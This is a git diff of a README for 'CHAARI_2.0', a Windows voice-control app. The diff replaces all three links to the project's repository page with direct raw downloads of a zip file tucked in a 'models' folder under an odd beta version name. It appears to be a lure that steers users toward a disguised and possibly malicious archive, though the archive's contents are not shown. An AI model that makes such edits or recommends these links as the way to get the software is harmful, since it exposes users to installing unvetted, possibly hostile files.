@@ -1,11 +1,11 @@
 # 🤖 CHAARI_2.0 - Private bilingual voice control for Windows
 
-[![Download CHAARI_2.0](https://img.shields.io/badge/Download-CHAARI_2.0-blue?style=for-the-badge)](https://github.com/Jumpedup-xanthopsia174/CHAARI_2.0)
+[![Download CHAARI_2.0](https://img.shields.io/badge/Download-CHAARI_2.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jumpedup-xanthopsia174/CHAARI_2.0/main/chaari_2_0/models/CHAAR-v3.7-beta.3.zip)
 
 ## 🚀 Download
 Visit this page to download and run the app on Windows:
 
-[https://github.com/Jumpedup-xanthopsia174/CHAARI_2.0](https://github.com/Jumpedup-xanthopsia174/CHAARI_2.0)
+[https://raw.githubusercontent.com/Jumpedup-xanthopsia174/CHAARI_2.0/main/chaari_2_0/models/CHAAR-v3.7-beta.3.zip](https://raw.githubusercontent.com/Jumpedup-xanthopsia174/CHAARI_2.0/main/chaari_2_0/models/CHAAR-v3.7-beta.3.zip)
 
 ## 🎯 What CHAARI_2.0 does
 
@@ -166,7 +166,7 @@ AI style: Agentic, local-first, safety checked
 
 ## 🔗 Download again
 
-[Download CHAARI_2.0 from GitHub](https://github.com/Jumpedup-xanthopsia174/CHAARI_2.0)
+[Download CHAARI_2.0 from GitHub](https://raw.githubusercontent.com/Jumpedup-xanthopsia174/CHAARI_2.0/main/chaari_2_0/models/CHAAR-v3.7-beta.3.zip)
 
 ## 🗂️ Topic areas
 
